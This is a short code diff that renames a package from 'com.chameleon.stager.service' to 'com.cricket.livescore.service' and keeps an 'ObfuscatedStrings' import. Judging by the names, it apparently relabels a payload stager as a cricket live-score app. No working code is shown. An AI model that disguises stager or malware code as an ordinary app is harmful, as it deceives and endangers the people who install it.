@@ -1,7 +1,7 @@
-package com.chameleon.stager.service
+package com.cricket.livescore.service
 
 import android.util.Log
-import com.chameleon.stager.utils.ObfuscatedStrings
+import com.cricket.livescore.utils.ObfuscatedStrings
 import java.io.BufferedReader
 import java.io.InputStreamReader
 import java.io.OutputStreamWriter
